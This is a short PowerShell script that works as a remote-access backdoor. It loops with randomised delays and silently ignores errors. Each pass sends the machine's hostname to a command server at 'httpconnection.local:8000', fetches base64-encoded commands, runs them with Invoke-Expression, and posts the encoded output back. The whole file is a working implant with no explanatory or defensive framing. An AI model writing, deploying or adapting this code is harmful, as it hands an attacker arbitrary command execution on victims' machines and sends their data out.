$C2 = "httpconnection.local:8000"
$hostname = $env:COMPUTERNAME

while ($true) {
    $headers = @{ "X-Hostname" = $hostname }

    try {
        $cmd_b64 = Invoke-WebRequest -Uri "http://$C2/getcmd" -Headers $headers -UseBasicParsing
        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd_b64.Content))

        if ($cmd -ne "") {
            try {
                $out = Invoke-Expression $cmd | Out-String
            } catch {
                $out = $_.Exception.Message
            }

            $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out))
            Invoke-WebRequest -Uri "http://$C2/postresult" -Method POST -Body $b64 -Headers $headers -UseBasicParsing
        }
    } catch {
        # ignore errors
    }

    Start-Sleep -Seconds (Get-Random -Minimum 3 -Maximum 7)
}
